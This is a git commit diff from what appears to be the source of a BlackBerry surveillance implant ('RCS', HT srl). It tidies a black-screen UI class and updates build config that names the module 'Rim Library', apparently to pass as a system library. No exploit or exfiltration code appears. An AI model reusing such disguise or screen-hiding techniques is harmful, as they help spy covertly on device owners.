7fa3f8a04114b393824986863248df4909cd6167
Fabrizio Cornelli <finance@suppose.it>
2012-03-19 17:10:42 +0100

    Blackscreen senza preprocess

--- RCSBlackBerry/src/blackberry/BlackScreen.java
+++ RCSBlackBerry/src/blackberry/BlackScreen.java
@@ -1,3 +1,11 @@
+//#preprocess
+
+/* *************************************************
+ * Copyright (c) 2010 - 2012
+ * HT srl,   All rights reserved.
+ * 
+ * Project      : RCS, RCSBlackBerry
+ * *************************************************/
 package blackberry;
 
 import net.rim.device.api.ui.Color;
@@ -6,38 +14,51 @@ import net.rim.device.api.ui.container.MainScreen;
 import blackberry.debug.Debug;
 import blackberry.debug.DebugLevel;
 
-public class BlackScreen extends MainScreen{
+public class BlackScreen extends MainScreen {
     //#ifdef DEBUG
-      private static Debug debug = new Debug("BlackScreen", DebugLevel.VERBOSE);
-      //#endif
-      
-      public BlackScreen(){
-          setTitle("Black");
-      }
-      
-      protected void onObscured(){
-          debug.info("Obscured");
-         /* Screen activeScreen = UiApplication.getUiApplication().getActiveScreen();        
-          activeScreen.getUiEngine().suspendPainting(true);
-          UiApplication.getApplication().requestForeground();*/
-      }
-      
-      protected void onExposed(){  
-          debug.info("Exposed");
-         /* UiApplication.getUiApplication().popScreen(this);
-          Screen activeScreen = UiApplication.getUiApplication().getActiveScreen();
-          if (activeScreen.getUiEngine().isPaintingSuspended()) {
-              activeScreen.getUiEngine().suspendPainting(false);
-          }
-          activeScreen.doPaint();*/
-      }
-      
-      public void paint(Graphics graphics) {        
-          // Sets the BackgroundColor
-          graphics.setBackgroundColor(Color.BLACK);
-          graphics.setColor(Color.WHITESMOKE);
-          graphics.drawText("Black", 0, 10);
-          // Clears the entire graphic area to the current background
-          graphics.clear();  
-      }
+    private static Debug debug = new Debug("BlackScreen", DebugLevel.VERBOSE);
+
+    //#endif
+
+    public BlackScreen() {
+        setTitle("Black");
+    }
+
+    protected void onObscured() {
+        //#ifdef DEBUG
+        debug.info("Obscured");
+        //#endif
+
+        /*
+         * Screen activeScreen =
+         * UiApplication.getUiApplication().getActiveScreen();
+         * activeScreen.getUiEngine().suspendPainting(true);
+         * UiApplication.getApplication().requestForeground();
+         */
+    }
+
+    protected void onExposed() {
+        //#ifdef DEBUG
+        debug.info("Exposed");
+        //#endif
+
+        /*
+         * UiApplication.getUiApplication().popScreen(this); Screen activeScreen
+         * = UiApplication.getUiApplication().getActiveScreen(); if
+         * (activeScreen.getUiEngine().isPaintingSuspended()) {
+         * activeScreen.getUiEngine().suspendPainting(false); }
+         * activeScreen.doPaint();
+         */
+    }
+
+    public void paint(Graphics graphics) {
+        // Sets the BackgroundColor
+        graphics.setBackgroundColor(Color.BLACK);
+        //#ifdef DEBUG
+        graphics.setColor(Color.WHITESMOKE);
+        graphics.drawText("Black", 0, 10);
+        //#endif
+        // Clears the entire graphic area to the current background
+        graphics.clear();
+    }
 }
--- RCSBlackBerry/src/blackberry/config/Cfg.java
+++ RCSBlackBerry/src/blackberry/config/Cfg.java
@@ -37,14 +37,14 @@ public class Cfg {
     //==========================================================
     // Compile configuration, do not edit under this line
 
-    public static final int BUILD_ID = 72;
-    public static final String BUILD_TIMESTAMP = "20120313-032337";
+    public static final int BUILD_ID = 73;
+    public static final String BUILD_TIMESTAMP = "20120319-050807";
     
     public static final String GROUP_NAME =  "Rim Library"; //"Rim Library";
     public static final String MODULE_NAME = "net_rim_bb_lib"; //"net_rim_bb_lib";
     public static final String MODULE_LIB_NAME = "net_rim_bb_lib_base"; //"net_rim_bb_lib_base";
 
-    public static final String RANDOM = "41877347CAB72BE1";
+    public static final String RANDOM = "7F5EC40C0E1E4ADF";
 
     //==========================================================
 }
